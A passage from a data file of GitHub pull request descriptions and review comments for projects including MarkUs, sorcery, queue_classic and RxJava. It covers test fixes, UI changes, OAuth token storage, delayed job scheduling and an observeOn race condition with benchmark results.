- Returned some code that was previously removed within the repo_browser.html.erb file to be consistent with master branch. 

- Majority of failing tests previously now pass.","['@david-yz-liu For the indentation issue, I looked into what\'s going on in the master branch and it seems that @toriverly created a fix for the ""breadcrumb"" issue, so I included it here.']"
71,MarkUsProject/Markus,1998.0,File size restriction on the file submission,"['I had to edit ""file_manager.html.erb"" to fix one issue:\r\n""added negation to the previous .nil fix. Without this negation the submission controller size limiting portion was breaking""\r\nI was able to successfully commit, but I cannot see this fix here. Is it because the branch is closed? After creating the new branch an running git diff on that one file I got empty result. I assume the change is here. It\'s very important to push it through, so I want to know for sure.', ""I already made this change, don't worry."", ""Didn't see this comment. Thank you. I'm deleting maryna_branch""]"
72,MarkUsProject/Markus,2018.0,"Fix for issue #1760 : 
Updated student interface's spreadsheet marks table to React
","['Two of the grade_entry_forms_controller_tests seem to be failing because they are using a regular expression to search for the expected result string from the response of a student_interface GET request.\r\n\r\nHowever, because we are using React tables now, I believe they are not compiling in the test and the table data is not updated, and a matching string is not found.\r\n\r\nAny ideas what we should do with these @david-yz-liu? ', ""@peterzhao333 I'm okay removing those asserts (not the full tests, just the RegEx asserts).\r\n\r\nEverything's looking good, except the spreadsheet columns should be sortable."", 'Thanks, @peterzhao333!']"
73,MarkUsProject/Markus,2034.0,"First version of the Course Summary page. The page is primarily a table in the following format 

| User Name  | First Name | Last Name | A1 | A2 | ... |
| ---------------- | --------------- | -------------- | ---- | ---- | --- |
| g8username  | First | Last | 50 / No Grade Received | 50 / No Grade Received | 50 / No Grade Received |

Future Pull Requests will include:

* Total - A running sum for each student
* Flexible Marking Schemes 
* Weighted Marks","['Also change the ""No Grade Received"" to ""N/A"".\r\n\r\n@ishanthukral I\'ve created a new branch called ""summaries-page"" - once you address my comments, make the pull request to that branch instead.']"
74,MarkUsProject/Markus,2040.0,"Template for the new ""Key Pairs"" page where students will manage their SSH keys for Git repo access.","['@SoftwareDev The page should appear for Admins as well.', ""@david-yz-liu You're right. It'll just have a different layout where they can manage all keys and upload as well. I'll get on that."", '@david-yz-liu A lot of this was auto-generated through scaffold, will be throwing out most of it.']"
75,MarkUsProject/Markus,2051.0,Turns out I refactored out some support for the multi-line annotations. I wasn't able to recreate the other issue but I tested it pretty thoroughly and found some other small things that snuck by (including one that would have been existing for the previous annotation setup).,"[""Yikes, I think I got all the major hound fixes. I'm not sure if I should change those two camel cases issues because they are from another class and that might make hound examine it as well. A bunch of these comments were from things I didnt even change"", ""@spring-ryanc I'm okay not fixing those changes (Hound is a bit odd). But the tests are failing - could you look into this?"", '@david-yz-liu You can create a config file based on [the defaults](http://robots.thoughtbot.com/hound-reviews-javascript-for-style-violations) to turn things like camel case variables off.', '@spring-ryanc Great job!']"
76,MarkUsProject/Markus,2052.0,,"['@MatakuT Your new tests seem to be failing (see Travis build)', 'I think I forgot to upload one important file', '@MatakuT Okay, it would be good to have tests which actually check the value of the time returned by the methods.', 'The time returned is always different, so I cannot compare it to a fixed string. If that is what you mean by checking the value', 'Even though the methods probably use the current time, which does change, it would be acceptable to check the computed time to within a certain tolerance (even in hours).', 'There seems to be a failing test.', 'That test had something to do with FactoryGirl naming conventions. They supposed to be unique for all tests. I assume that it is failing because of group names not being unique. Will see if my commit will fix that']"
77,MarkUsProject/Markus,2055.0,,"['@MatakuT This is a good start, although there are some outstanding Hound comments', ""Will fix houndci and potential Travis CI's complaints a bit later.\r\nWill also revisit commented-out tests""]"
78,MarkUsProject/Markus,2077.0,,"['I tried to cut the line length as much as possible to make the code still readable. \r\nAlso, there are two failing tests that will pass as soon as the tickets that I issued will be handled.\r\nThe ticket numbers: #2078 , #2075 ', 'Cut the line lengths to 80, please.', 'Comment out the failing tests and add a note to those two issues, then.']"
79,MarkUsProject/Markus,2079.0,"Now, whenever a user uploads a bad csv file (either malformed
or a binary file with csv extension) the problem will be caught
and gracefully handled by flashing an error. This error message
has been localized with Google Translate. Tests have been written
for all of the affected files. Fixes #2075.","['Should a separate issue be opened to get proper localization?', ""@paymog Yay! Don't worry about localization right now.""]"
80,MarkUsProject/Markus,2084.0,,"[""I think the message is fine.\r\nIt sounds from @DustinWehr that it may not address his main concern which is pdf files that the MarkUs viewer can't open.  I think we could go ahead with this fix, and continue to work on that issue.""]"
81,MarkUsProject/Markus,2097.0,"When a marker creates a new annotation with math in it,
a preview of the annotation will be shown to the marker
in the create-an-annotation popup.

This preview will only be shown if there is math content. ie: if there exists something to the effect of ```$$\sum$$```. Specifically, there need to be at least two sets of ```$$```.","['The problem with this approach is the MathJaX is re-rendered on every keyup, which doesn\'t look great.\r\n\r\nI\'d prefer having two tabs, like ""Edit"" and ""Preview"", where the MathJaX is only rendered when the user clicks on the Preview tab.', ""Is there a reason you'd like tabs other than the current rendering issue? The reason I ask is because I first gave tabs a shot but couldn't figure out a UI and on more thought decided that the UX of tabs isn't all that great (takes the user out of the context of writing the annotation). \r\n\r\nI have two different ideas for fixing the rendering issue:\r\n1) Render on a timeout. ie: render the math once the user takes a 3 second pause from typing\r\n2) Have the user press a button to see the preview which gets hidden on typing.\r\n\r\nWhat do you think?"", 'Couple of style things for the Javascript:\r\n\r\n1. Please use single-quotes instead of double-quotes\r\n2. Use `!==` instead of `!=`\r\n3. Put spaces after `if`, before `{`, and after `}`\r\n\r\nThe annotation preview is certainly smoother now, though the fact that the text appears instantly but only renders in MathJaX every 3 seconds is still odd. I think I button would be best. Do you still have time to work on this?', 'I do. I should be able to finish that up tomorrow.', '@paymog Yay! Looked great; I made a couple of small style tweaks, which you can checkout in the extra commit. Well done.']"
82,MarkUsProject/Markus,2116.0,"Overwrite option for CSV Grades Upload. 

New checkbox in grades upload modal that allows user to indicate if they want the CSV data to overwrite existing grades or not.",[]
83,MarkUsProject/Markus,2121.0,"Here are the changes to the git branch which integrate MarkUs with the fine-grained access controller and repository hoster which is Gitolite.

Notable changes:
- A ""Key Pairs"" page has been added which allows all users of MarkUs to upload and manage their public keys which allow SSH authentication with the git repositories and Gitolite.
- Repository creation is now handled by the Gitolite server and no longer by native MarkUs code itself. (MarkUs now clones the repos which are created by Gitolite calls and maintains compatibility with the SVN branch)
- Some additional constants have been added to the environment setup files.

-------------------------------------------------------------------------------------------------------------
Additional Gitolite Setup and Instruction material will be added to the Wiki pages soon.

I plan to do some more visual updates to the Key Pairs pages over this upcoming month.",[]
84,MarkUsProject/Markus,2127.0,,"[""The reason why I changed the lib file is that the test was failing in memory_repository.rb (line 449):\r\nif path.nil? || (!path.nil? && @timestamps_revisions[Marshal.dump(best_match)].revision_at_path(path))\r\n\r\nERROR: revision_at_path was called on nil\r\n\r\nMarshal.dump(best_match) was producing the right result, but its format was slightly different from the format of the actual hash key. I think that's due to Marshal not completely interpreting Time class correctly. I was trying to find a way to convert Marshal.dump(best_match) to match the key, but nothing came to mind. I ended up converting the actual key. Calling dump function twice on key did the trick. I'm not sure if that is going to break any other functionality - it seems to be working just fine for assignment class\r\n"", ""Thanks, @MatakuT. I'm really not sold on this forking anyway, so hopefully we'll be able to resolve this in a more robust way later.""]"
85,MarkUsProject/Markus,2128.0,,[]
86,MarkUsProject/Markus,2131.0,,"['@ishanthukral Looks like you need to remove the marking_schemes_controller_test, which appears to have been automatically generated.', ""I'm suspecting some changes to ```Submission``` caused marks to not be retrieved. I changed ```Course Summaries``` to use the methods used by ```Assignment``` to display marks in the summaries section.""]"
87,MarkUsProject/Markus,2140.0,Work of @ishanthukral.,"['@arkon If you want to make changes, go ahead and submit another PR.', '@david-yz-liu Alright, sounds good!']"
88,MarkUsProject/Markus,2147.0,"Instead of using custom SASS mixins to handle common vendor prefixes, just use [autoprefixer-rails](https://github.com/ai/autoprefixer-rails/) to deal with it.

Also added a config file for the SASS linting.","['Thanks, @arkon!', ""@arkon Can you check out the student file manager? The buttons look quite grey, and I don't think that was the intended effect. I worry that the `linear-gradient` isn't working.""]"
89,MarkUsProject/Markus,2168.0,"When uploading a csv, the auth file now only gets rewritten once at the end, rather than once per group. This is done using the new method __generate_authz_file in the SubversionRepository class.

These changes speed up the process considerably. Before, uploading 600 names with allow_web_submits=true took 1:35 seconds. It now takes 35 seconds. And where uploading 600 names with allow_web_submits=false took 3 minutes, now takes 1.

I also added the names in students.csv into longstudents.csv, so students.csv is a proper subset of longstudents.csv. This should prevent future bugs when testing with longstudents.csv.","[""@hootiehoo You can replace Karen's old longstudents file with yours. Also, please change the seeds file back to the original 216-student list (though you can leave the new one as a comment to enable easy toggling).""]"
90,MarkUsProject/Markus,2176.0,"In advance of uploading the ""git"" branch development instructions for our Vagrant box I found that an additional parameter needed to be added to the config files.",[]
91,MarkUsProject/Markus,2192.0,"Basically adding configuration that Alan's done manually before this.

Also adds a custom message for a valid user login but who is not found in the MarkUs database, and an invalid password.",[]
92,NARKOZ/gitlab,15.0,,"['Can you add tests?', 'Tests added.', 'Pushed the attributes changes as suggested and updated tests to reflect it.', 'Thank you.', ""Awesome!\r\n\r\nMind publishing the changes to Rubygems so that I don't need to host it internally? :-)""]"
93,NoamB/sorcery,630.0,"I wanted to use sorcery as the authentication library with Oauth for external services, but needed to be able to access and store the user oauth token for use with other libraries, such as heroku's platform-api and github_api.

This commit does just that, by modifying get_user_hash to include the access_token token and refresh_token if present.

For example, if the authentications table is updated to include a field for token and refresh_token, a modified callback method on OauthsController can be used to update the authentication to include the token and refresh token for later use:

    def callback
      provider = params[:provider]
      unless @user = login_from(provider)
        if @user = User.find_by_email(@user_hash[:email])
          @user.add_provider_to_user(provider, @user_hash[:uid])
        elsif current_user && @user = current_user
          current_user.add_provider_to_user(provider, @user_hash[:uid])
        elsif @user = create_from(provider)
          reset_session
        end
      end
      if @user
        @user.send(provider).update_attributes(token: @user_hash[:token], refresh_token: @user_hash[:refresh_token])
        auto_login(@user)
        redirect_to root_path, :notice => ""Logged in from #{provider.titleize}!""
      else
        redirect_to root_path, :alert => ""Failed to login from #{provider.titleize}!""
      end
    end

I felt like this was an unobtrusive way of providing this potential functionality to those who need it, without adding undue burden on those who didn't.","['Hi @tyrauber \r\n\r\nI see 2 pull requests opened by you. How do they relate to each other?', 'The first pull request (#629) adds heroku as a provider.  The second pull request (#630) returns a token and refresh token if present in the access_token hash, allowing the app to store the token for future use.\r\n\r\nThey only relate in that heroku will return the token in their access_token response.', '@arnvald, Any questions about these pull requests or their purposes?  I was just interested in using sorcery with Heroku OAuth and the Heroku platform-api gem.  Happy to make changes as required to see these features integrated into master.', ""@tyrauber it's rather a matter of my time for the project, recently I haven't had a lot of it. I'll read the code this week and will comment if there's anything I have doubts about"", '@tyrauber +1 for expose_token. Sad that you made expose_token feature depend on heroku_provider.', '@arnvald, Made the changes as suggested:\r\n  -  Changed the providers/base method name from user_hash to auth_hash\r\n  -  Fixed typo in heroku documentation\r\n  -  Changed from merge! to normal hash assignment as each key is being assigned individually\r\nAlso:\r\n  -  Added expires_in and expires_at to auth_hash\r\n  -  Rebased off upstream master\r\n\r\nThanks for reviewing this.', 'Thanks, @tyrauber! :+1: ']"
94,OfficeDev/ews-java-api,283.0,,"[""Hi __@vbauer__, I'm your friendly neighborhood Azure Pull Request Bot (You can call me AZPRBOT). Thanks for your contribution!\n    <span>You've already signed the contribution license agreement. Thanks!</span>\n        <span>We will now validate the agreement and then real humans will evaluate your PR.</span>\n\nTTYL, AZPRBOT;\n"", ':+1: I am wondering if it might be useful to allow users of the api to pass in their own `HostnameVerifier`?', ""Updated. I've split changes in several commits for better understanding."", '@vbauer do you also have any opinions on my previous [comment](https://github.com/OfficeDev/ews-java-api/pull/283#issuecomment-89817067)?', '@serious6 It is already implemented here: https://github.com/vbauer/ews-java-api/commit/bb600d5984506bb8770cc99b1e6077561583525b\r\n\r\n`EwsSSLProtocolSocketFactory` allows to configure `HostnameVerifier` and `ExchangeServiceBase` allows to override method `createConnectionSocketFactoryRegistry` to configure socket factory.', ""sry didn't have that on my mind. Maybe you can add this to the wiki with a small example? I think if possible there also could be added some javaDocs (ref. `EwsSSLProtocolSocketFactory`) :yum: "", ""@serious6 No problem, I'll do it asap."", 'Updated.\r\n\r\nPS: I had to open `AutodiscoverService` and `ExchangeService` for extending. It could be also useful for other developers.\r\n\r\nUPD: Wiki page: https://github.com/OfficeDev/ews-java-api/wiki/Custom-Exchange-services', '@vbauer thanks for the contribution. As mentioned we should discuss the idea folder issue later on.']"
95,OfficeDev/ews-java-api,348.0,,"[""Hi __@vbauer__, I'm your friendly neighborhood Azure Pull Request Bot (You can call me AZPRBOT). Thanks for your contribution!\n    <span>You've already signed the contribution license agreement. Thanks!</span>\n        <span>We will now validate the agreement and then real humans will evaluate your PR.</span>\n\nTTYL, AZPRBOT;\n"", 'looks good :+1: ', 'Looks good.  Would be nice to do some non-UTC tests and potentially support case-insensitive lookups in the timezone hashmap.', ""It looks like `TimeZone` class doesn't support case-insensitive identifiers  (see TimeZone.getTimeZone) and method TimeZoneUtils.getMicrosoftTimeZoneName works with it.\r\n\r\nI'll add some positive and negative tests for lookup."", 'PR was updated.', 'Thx for CR, PR was updated.', 'PR was update. I think it will be enough to have test with ""Africa/Abidjan"" timezone.', '@vbauer thanks for your contribution']"
96,QueueClassic/queue_classic,217.0,"I think having the ability to schedule a job for execution after a given point in time is a crucial feature for a background processing system.
At the moment, this is possible with *queue_classic* only by using [queue_classic-later](https://github.com/dpiddy/queue_classic-later), which is quite clunky to use (you need a second database table and a tick process).

So I quickly implemented a very minimal solution that uses the already existing *created_at* column of the jobs table to specify the time by which a job may be executed.

##### Example:

```ruby
# schedule a job in 10 seconds
QC.enqueue_at Time.now + 10, 'Kernel.puts'
# job is not being locked at this point in time
QC.lock # => nil
# when you wait (at least) 10 seconds...
sleep 10
# job can be locked now
QC.lock # => {method: 'Kernel.puts', ...}

# scheduling a job without a time constraint
# works just as it used to
QC.enqueue 'Kernel.print'
QC.lock # => {method: 'Kernel.print', ...}
```

What do you think? Is this feature generally a useful addition? If yes: is the implementation/API ok or would there be a better solution?


*Note: this pull request would need some more work (e.g. documentation) which I would gladly provide/improve, if you decide that you want this feature...*","[""I'm sure it's useful and I have implemented scheduling systems for QC before. We used to focus on a very small core library that is easy to extend. (seen by the compactness of this patch).\r\n\r\nI'd like to hear from @ryandotsmith about the scope we want to cover."", ""There is an issue opened by @ryandotsmith on qc-later about making it into the core. Personally, I think this makes a lot of sense. I don't have time to review the implementation right now myself though...\r\n\r\n\xe2\x80\x94\r\nSent from my phone\r\n\r\nOn Tue, May 6, 2014 at 5:47 AM, Yves Senn <notifications@github.com>\r\nwrote:\r\n\r\n> I'm sure it's useful and I have implemented scheduling systems for QC before. We used to focus on a very small core library that is easy to extend. (seen by the compactness of this patch).\r\n> I'd like to hear from @ryandotsmith about the scope we want to cover.\r\n> ---\r\n> Reply to this email directly or view it on GitHub:\r\n> https://github.com/ryandotsmith/queue_classic/pull/217#issuecomment-42283755"", ""@severin btw your build failed due to #212, but in general I think this looks like a good way to do it. :+1: \r\n\r\nThere may be issues with indexing on large amounts of jobs, assuming ```created_at``` isn't indexed correctly (which, I didn't check)."", '@ukd1 I know that the failures are not caused by my changes, but thanks for mentioning it.\r\n\r\nYou are right about potential performance problems (`created_at` is not indexed). I will do some performance tests and add an index if necessary if @ryandotsmith approves my approach and is willing to merge to polished pull request...', ""I really like the simple approach here. Would be happy to have this feature in the library.\r\n\r\nI do have some concern about passing in Ruby's time to enqueue but using PostgreSQL's time for dequeue. Thoughts? Is there a way we can rely solely on PostgreSQL's time?"", ""@ryandotsmith we could only allow offsets to be used instead of timestamps from Ruby - i.e. not before in 60 seconds from now, that way we can calc the actual timestamp in sql.\r\n\r\n```ruby\r\nQC.enqueue_at Time.now + 10, 'Kernel.puts'\r\n```\r\n\r\nbecomes\r\n\r\n```ruby\r\nQC.enqueue_in 10, 'Kernel.puts'\r\n```\r\n\r\n/cc @severin "", ""I like the idea of using an offset since it fundamentally guards against time zone/sync issues. Perhaps I am going overboard... We could still store the data as a timestamp. Might be able to do something like this in the sql:\r\n\r\n```\r\nINSERT INTO #{TABLE_NAME} (q_name, method, args, lock_after) \r\nVALUES ($1, $2, $3, now() + '$4 seconds')\r\n```"", ""@ryandotsmith yeah that's what I was suggesting: Ruby should change the offset in to seconds, then we should use ```CURRENT_TIMESTAMP + INTERVAL '$4 second'``` or similar. I think this will avoid all the issues you are (rightly) worried about."", '@severin you down for implementing the above changes?', ""@ukd1 @ryandotsmith thanks for all your inputs! I like the idea about passing an offset in seconds from ruby and calculating the final timestamp in sql.\r\n\r\nI'll try to implement it today or tomorrow and I'll update the pull request."", '@ukd1 @ryandotsmith I implemented your suggestions.\r\n\r\nI also added a convenience method so that now both syntaxes/APIs (`QC::Queue#enqueue_in(seconds, method, *args)` as well as `QC::Queue#enqueue_at(time, method, *args)`) work...', '@severin looks good, I think the last remaining issue is around the indexing.', ""@ukd1 @ryandotsmith  I looked into indexing a bit and gave it a first shot, see the last commit. \r\n\r\nHowever, I'm new to postgres and not really up to speed with best practices and therefore I do have two questions:\r\n- Since postgres can use multiple indices in a query I just added a new index on just the `created_at` field. Would having a combined index on `q_name, created_at` be better in our case?\r\n- `CREATE INDEX` blocks the table for writes, so one should use `CREATE INDEX CONCURRENTLY` to avoid downtime. However, using `CREATE INDEX CONCURRENTLY` is not possible in the existing upgrade migration, since it cannot be used in a transaction and also not in a multi-command string (*CREATE INDEX CONCURRENTLY cannot be executed from a function or multi-command string SQL state: 25001*). What's the best way to deal with this? Leave the write blocking `CREATE INDEX` in the migration and add a note about potential implications to the upgrade notes?"", ""@ukd1 @ryandotsmith I added an index for the timestamp column, renamed it to `scheduled_at` (I'm open for other suggestions) and added documentation for the feature...\r\n\r\nDo you have any other inputs or wishes?"", ""Isn't the created_at also useful, to debug failed jobs in a failed queue and that kind of stuff? I think created_at and scheduled_at should both be present."", ""@jipiboily: up until now the `created_at` column was only used to measure the time between scheduling a job and it being locked. This functionality still works correct with the column renamed and repurposed as `scheduled_at`...\r\nI agree that a `created_at` timestamp would sometimes be nice to have, but I don't know if it is in the scope of this pull request..."", ""Unless I am misunderstanding something (that's possible! :smile:), it should be in the scope of any PR not to **remove** a column? :wink:\r\n\r\nAll that said, thanks for your work, it is appreciated! :) "", '@jipiboily I did not remove the column, I just renamed it (and extended its use).\r\n\r\nThe column `created_at` was only used to calculate the time that elapsed between the job becoming available for  locking and locking it (see [these lines](https://github.com/ryandotsmith/queue_classic/blob/6554b694d1c4b0262a7124f841e079b834c91bf3/lib/queue_classic/queue.rb#L53..L57)). This feature is still working correctly, so I did not remove any functionality... Since as I understand it the column was added to do this timing calculation and not strictly to provide the timestamp of when a job was created (this was just a side-effect).\r\n\r\nThis is why I say that introducing a column to track the creation time of a job is not in the scope of this pull-request...\r\n\r\nIt is a bit hard to explain, but I hope I could clarify my point? ;)', 'It might not be used in the code, but in my day to day life, this is really useful to know when a job was created. We have alerting around that to make sure jobs are not stuck, among other things. In that regard, I think this is a regression.\r\n\r\nI understand your point and I am not the one who will decide AFAIK, but wanted to jump in and give my point of view. No offense! :)', 'No offense taken! ;)\r\n\r\nBut do you actually really need the time a job was created? Keep in mind that `scheduled_at` is actually the same as `created_at` when you do not delay your job but enqueue it for immediate execution?', ""With QC3 released, removing `created_at` would be a breaking change. Sorry, this really wasn't a mean way of winning my point!\r\n\r\nWhat is the overall status of this? Is it missing so sort of tick, whatever the way it would work (thread, different process, etc)?"", ""@jipiboily I rebased my branch on the new master and reverted the renaming of the `created_at` column...\r\n\r\nI still think this pull request is good (especially now in the light of Rails 4.2's *ActiveJob*); so if someone could review my index implementation regarding the [comments I made earlier](https://github.com/ryandotsmith/queue_classic/pull/217#issuecomment-42644799) then it could be merged...\r\n"", ""@severin I love this. @jipiboily / @ryandotsmith this looks ok to me, simple way of getting stuff queued to be done in the future. We should test this and ship now it's not breaking unless I'm missing something?"", ""@ukd1 no it's not breaking... And btw: the travis failures are not related to this pull request, see https://github.com/ryandotsmith/queue_classic/pull/219#issuecomment-43087154"", ""@severin sorry typo, ``it's not breaking`` --> ``it's non breaking``, I think this is good to go - though I want to test it with @jipiboily "", 'Looks golf to me. One thing that needs to be changed is move the SQL update into a new update_to_3_1_0, include all the new stuff and create a rails migration too.\r\n\r\nDoes that make sense?', ""Of course, I'll do it tomorrow or so..."", '@jipiboily I finally managed to further work on this...\r\n\r\nI created new migrations with my additional stuff and I also introduced a new column for storing the scheduling time (`scheduled_at`). In my opinion it makes sense to keep this separate from the creation time which is stored in `created_at`.  Is this ok?\r\n\r\nBy the way: only the last commit (https://github.com/severin/queue_classic/commit/9cbc13633a8f97c818d332c71565c394c5c0abbf) is new, I rebased my branch on top of master so all commits show up as new...\r\n\r\n@ukd1 @ryandotsmith please also feel free to look over this pull request once again...', '@severin this looks great at first, thanks! I am planning to play with it today and also try it with ActiveJob.\r\n\r\nAgain, thanks a lot for this PR!\r\n\r\n:heart:', ""@jipiboily you'e welcome! Please report any problems or improvement suggestions.""]"
97,ReactiveX/RxJava,2776.0,,"['added super to generic type T', 'I will manually add Experimental to it after merging.', 'Thanks @stevenzwu ', 'thanks. looks like I missed a lot of details :)']"
98,ReactiveX/RxJava,2914.0,"This is an optimization for `takeLast` when called with parameter 1. Using `OperatorTakeLast` carries unnecessary overhead for the `takeLast(1)` case and a decent throughput improvement (x2) for streams of 100 elements or more is seen in the benchmarks below.

`takeLast(1)` is used by the following operators which will also demonstrate a throughput improvement:

* `last`, `lastOrDefault`
* `reduce`
* `collect`
* `count`, `countLong`

Benchmarks comparing using the new `OperatorTakeLastOne` and `OperatorTakeLast`:

```
Benchmark                                                        Mode   Samples        Score  Score error    Units
r.o.OperatorTakeLastOnePerf.takeLastOneUsingTakeLastOne_Few     thrpt         5  2235516.141   129091.019    ops/s
r.o.OperatorTakeLastOnePerf.takeLastOneUsingTakeLastOne_Many    thrpt         5      103.980        9.233    ops/s
r.o.OperatorTakeLastOnePerf.takeLastOneUsingTakeLastOne_Some    thrpt         5   984689.481    48560.897    ops/s
r.o.OperatorTakeLastOnePerf.takeLastOneUsingTakeLast_Few        thrpt         5  2187421.223    93550.379    ops/s
r.o.OperatorTakeLastOnePerf.takeLastOneUsingTakeLast_Many       thrpt         5       54.575        2.054    ops/s
r.o.OperatorTakeLastOnePerf.takeLastOneUsingTakeLast_Some       thrpt         5   466892.497     9267.405    ops/s

```","[""Thanks @akarnokd for the review, I appreciate the lessons!\r\n\r\nI've incorporated the changes except for the `ignoreElements` optimization which I'll leave for another PR.\r\n\r\nI wrote this up before you submitted the `SingleDelayedProducer` in #2901 but had spotted its usefulness. It's very close to being reusable here, just have to handle the empty stream case which is allowed by `takeLast`. I submitted this anyway because it helps me learn, thanks.\r\n\r\nUp to you of course if you want to merge this or wait for #2901 to be merged then get another PR that uses a modified `SingleDelayedProducer` (might have its name changed if it allows single or none).\r\n\r\nUpdated benchmarks (that's a nifty trick using Params):\r\n\r\n```\r\nBenchmark                                                  (size)   Mode   Samples        Score  Score error    Units\r\nr.o.OperatorTakeLastOnePerf.takeLastOneUsingTakeLast            5  thrpt         5  2233452.067    81630.798    ops/s\r\nr.o.OperatorTakeLastOnePerf.takeLastOneUsingTakeLast          100  thrpt         5   444353.711   224920.714    ops/s\r\nr.o.OperatorTakeLastOnePerf.takeLastOneUsingTakeLast      1000000  thrpt         5       56.947        2.630    ops/s\r\nr.o.OperatorTakeLastOnePerf.takeLastOneUsingTakeLastOne         5  thrpt         5  2372577.831    76820.729    ops/s\r\nr.o.OperatorTakeLastOnePerf.takeLastOneUsingTakeLastOne       100  thrpt         5  1012528.600    75674.064    ops/s\r\nr.o.OperatorTakeLastOnePerf.takeLastOneUsingTakeLastOne   1000000  thrpt         5      108.284        4.965    ops/s\r\n```\r\n"", ""Thanks @akarnokd.  I've added your suggestions:\r\n* shortcut to completion when empty\r\n* test for `takeLast(0)`"", 'Thanks!', ':+1: ']"
99,ReactiveX/RxJava,2929.0,"This is a fix for a race condition in `OperatorObserveOn` where if thread A gets to L164 and thread B starts the pollQueue loop then it will act as if the stream had completed normally instead of with an error. 

The effect is that a stream could appear to complete normally when in fact an error had occurred.

Using two boolean volatiles `completed` and `failed` that as a pair were not atomically updated/read exposed us to this race condition. 

The fix is to use a single volatile integer `status` to represent the  states ACTIVE, COMPLETED, ERRORED to replace `completed` and `failed`.


","[""seeing as I don't use AtomicInteger methods on `status` I may as well just use a byte to store these. I'll update the PR"", ""I expect also that the lines below in `onCompleted` and `onError` methods are not required because those methods will not be run at the same time and the methods are not reentrant (I hope that's the right term):\r\n\r\n```java\r\n if (error != null) {\r\n    return;\r\n }\r\n```\r\n\r\nI'll remove them in an update to the PR now"", ""Nice catch, but you don't need to introduce that state variable. Remove ```failure``` and make ```error``` volatile. In the ```pollQueue```, if ```completed``` is true, read error and if it is nonnull, report it and return. Otherwise, check if queue is empty and if so, send onComplete(). I'm not sure about why there is the ```requested == 0``` because, I think, it will just make the loop spin until the request value reaches zero by the getAndDecrement below it.\r\n"", ""Ok I'll have a look at that. I agree that the `pollQueue` logic is weird and needs review. I wanted to leave it basically untouched to just review the race condition fix."", ""Righto, I've run with your suggestion. I also removed the `requested == 0` check because it seems pointless. Apart from that the logic is equivalent. I'm not very keen on the second `if (finished)` block, I'd prefer it to loop around again but might be slightly more performant.\r\n\r\nBy the way I renamed `completed` to `finished` so it could carry the sense of either `onComplete` or `onError`. If that is inconsistent with naming elsewhere I can change it back."", 'Looks good. Could you do a perf comparison?', 'Sure', ""Benchmarks improved a few percent in general:\r\n\r\n```\r\n1.x branch:\r\n\r\nBenchmark                                         (size)   Mode   Samples        Score  Score error    Units\r\nr.o.OperatorObserveOnPerf.observeOnComputation         1  thrpt         5    70535.751    15423.954    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation      1000  thrpt         5    10852.111     3038.402    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation   1000000  thrpt         5       29.313        3.500    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate           1  thrpt         5  8477545.925   290748.417    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate        1000  thrpt         5   130930.008     8774.301    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate     1000000  thrpt         5      119.666        2.875    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread           1  thrpt         5     9045.354     1739.331    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread        1000  thrpt         5     5090.723      359.544    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread     1000000  thrpt         5       27.364        1.785    ops/s\r\n\r\nobserve-on-race branch:\r\n\r\n\r\nBenchmark                                         (size)   Mode   Samples        Score  Score error    Units\r\nr.o.OperatorObserveOnPerf.observeOnComputation         1  thrpt         5    73963.037    20044.651    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation      1000  thrpt         5    11155.981     7426.208    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation   1000000  thrpt         5       29.820        1.742    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate           1  thrpt         5  9136674.653   428898.037    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate        1000  thrpt         5   136164.981     3340.247    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate     1000000  thrpt         5      119.388        2.231    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread           1  thrpt         5     8476.745     1586.126    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread        1000  thrpt         5     5129.316      586.046    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread     1000000  thrpt         5       31.284        2.868    ops/s\r\n```\r\n\r\nRan using \r\n\r\n`./gradlew benchmarks '-Pjmh=-f 1 -tu s -bm thrpt -wi 5 -i 5 -r 1 .*OperatorObserveOn.*'`\r\n"", ""I'll just fix a comment and I don't think `onNext` needs to check `finished`. Might rerun perfs after that change."", ""The variability in perfs is pretty large. I'll run the full benchmarks and report back on those."", 'i usually run observeOn perf with -r 5 .', ""Thanks, I used \r\n\r\n```\r\n./gradlew benchmarks '-Pjmh=-f 1 -tu s -bm thrpt -wi 5 -i 5 -r 5 .*OperatorObserveOn.*'\r\n```\r\n\r\nI'd call it a draw:\r\n\r\n```\r\n1.x branch:\r\n\r\nBenchmark                                         (size)   Mode   Samples        Score  Score error    Units\r\nr.o.OperatorObserveOnPerf.observeOnComputation         1  thrpt         5    79456.426    36108.380    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation      1000  thrpt         5    11094.927     2290.069    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation   1000000  thrpt         5       28.735        3.461    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate           1  thrpt         5  8387544.528   589105.152    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate        1000  thrpt         5   134932.398     3153.000    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate     1000000  thrpt         5      118.703       13.585    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread           1  thrpt         5     8418.924      423.795    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread        1000  thrpt         5     4879.297      213.291    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnNewThread     1000000  thrpt         5       29.267        0.362    ops/s\r\n\r\nobserve-on-race branch:\r\n\r\nBenchmark                                         (size)   Mode   Samples        Score  Score error    Units\r\nr.o.OperatorObserveOnPerf.observeOnComputation         1  thrpt         5    71650.362     7807.887    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation      1000  thrpt         5    10936.904     1868.829    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnComputation   1000000  thrpt         5       29.325        2.208    ops/s\r\nr.o.OperatorObserveOnPerf.observeOnImmediate           1  thrpt         5  8297987.180   437741.592    